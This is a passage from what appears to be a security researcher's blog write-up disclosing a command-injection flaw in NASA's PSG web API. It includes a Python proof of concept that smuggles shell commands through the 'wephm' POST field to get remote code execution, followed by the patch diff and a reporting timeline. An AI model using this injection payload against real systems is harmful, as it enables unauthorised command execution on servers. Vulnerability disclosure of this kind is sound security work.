+</span></span><span style="display:flex;"><span>&lt;SURFACE-GAS-UNIT&gt;ratio
+</span></span><span style="display:flex;"><span>&lt;GENERATOR-INSTRUMENT&gt;user
+</span></span></code></pre></div><p>The value of psg_cfg.txt file are as above. I made some modifications to the file because the values are very long.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://psg.gsfc.nasa.gov/api.php&#34;</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;&lt;OBJECT&gt;Exoplanet
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;SURFACE-GAS-UNIT&gt;ratio
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;GENERATOR-INSTRUMENT&gt;user &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;file&#34;</span>:data,<span style="color:#e6db74">&#34;wephm&#34;</span>:<span style="color:#e6db74">&#34;pocas;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&gt;graphs/e1xnup1r;echo x&#34;</span><span style="color:#f92672">.</span>format(cmd)})
+</span></span><span style="display:flex;"><span>    print(requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://psg.gsfc.nasa.gov/graphs/e1xnup1r&#34;</span>)<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>The final poc is as above.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>Execute the PoC code and I saw Remote Code Execution happen!</p>
+<p>This was a very interesting and amazing! It was a good analysis and experience for me 😉 Thanks for help from <a href="https://twitter.com/PewGrand">@PewGrand</a>, I learn a lot thanks to you!</p>
+<p>And Next Day, When I woke up from sleep and checked the vulnerability, it was patched! But they didn’t contact me. So I found out on Twitter that NASA is not responding to the vulnerability. So, if someone just finds it, it is to report it for the purpose of public interest. 😢</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>  $wgeo=&#39;y&#39;;$wephm=&#39;n&#39;;$watm=&#39;n&#39;;$whdr=&#39;y&#39;;$wgen=&#39;y&#39;;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">- if (isset($_POST[&#39;wgeo&#39;]))  $wgeo = $_POST[&#39;wgeo&#39;];  else $wgeo = &#39;y&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">- if (isset($_POST[&#39;wephm&#39;])) $wephm= $_POST[&#39;wephm&#39;]; else $wephm= &#39;n&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">- if (isset($_POST[&#39;watm&#39;]))  $watm = $_POST[&#39;watm&#39;];  else $watm = &#39;n&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">- if (isset($_POST[&#39;whdr&#39;]))  $whdr = $_POST[&#39;whdr&#39;];  else $whdr = &#39;y&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">- if (isset($_POST[&#39;type&#39;]))  $otyp = $_POST[&#39;type&#39;];  else $otyp = &#39;rad&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">- if (isset($_POST[&#39;mode&#39;]))  $mode = $_POST[&#39;mode&#39;];  else $mode = &#39;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+ if (isset($_POST[&#39;wgeo&#39;]))  $wgeo = preg_replace(&#39;/[^a-z]/&#39;, &#39;&#39;, substr($_POST[&#39;wgeo&#39;],0,1));  else $wgeo = &#39;y&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+ if (isset($_POST[&#39;wephm&#39;])) $wephm= preg_replace(&#39;/[^a-z]/&#39;, &#39;&#39;, substr($_POST[&#39;wephm&#39;],0,1)); else $wephm= &#39;n&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+ if (isset($_POST[&#39;watm&#39;]))  $watm = preg_replace(&#39;/[^a-z]/&#39;, &#39;&#39;, substr($_POST[&#39;watm&#39;],0,1));  else $watm = &#39;n&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+ if (isset($_POST[&#39;whdr&#39;]))  $whdr = preg_replace(&#39;/[^a-z]/&#39;, &#39;&#39;, substr($_POST[&#39;whdr&#39;],0,1));  else $whdr = &#39;y&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+ if (isset($_POST[&#39;mode&#39;]))  $mode = preg_replace(&#39;/[^a-z]/&#39;, &#39;&#39;, substr($_POST[&#39;mode&#39;],0,1));  else $mode = &#39;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>  if ($otyp==&#39;set&#39; || $otyp==&#39;upd&#39;) exit();
+</span></span><span style="display:flex;"><span>  if ($otyp==&#39;cfg&#39; || $otyp==&#39;ret&#39;) {                      $wcon=&#39;n&#39;; $wgas=&#39;n&#39;; $wgen=&#39;n&#39;;}
+</span></span><span style="display:flex;"><span>  if ($otyp==&#39;str&#39; || $otyp==&#39;srf&#39;) {$wgeo=&#39;n&#39;; $watm=&#39;n&#39;; $wcon=&#39;y&#39;; $wgas=&#39;n&#39;; $wgen=&#39;n&#39;;}
+</span></span><span style="display:flex;"><span>  if ($otyp==&#39;tel&#39;) {                $wgeo=&#39;n&#39;; $watm=&#39;n&#39;; $wcon=&#39;n&#39;; $wgas=&#39;n&#39;; $wgen=&#39;y&#39;;}
+</span></span><span style="display:flex;"><span># /var/www/html/api.php
+</span></span></code></pre></div><p>This issue was fixed that add substr() function. So I thought I try bypass this. But I decided not to do after to see the patch code.  this is impossible to bypass.</p>
+<hr>
+<h3 id="reporting-timeline">Reporting Timeline<a href="#reporting-timeline" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ul>
+<li>2021-11-22 13h 03m : Reported this issue via the <a href="mailto:soc@nasa.gov">soc@nasa.gov</a>.</li>
+<li>2021-11-23 ??h ??m : Patched this issue</li>
+<li>2022-02-14 ??h ??m : Released a <a href="https://hub.docker.com/r/nasapsg/psg">docker file</a></li>
+</ul>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
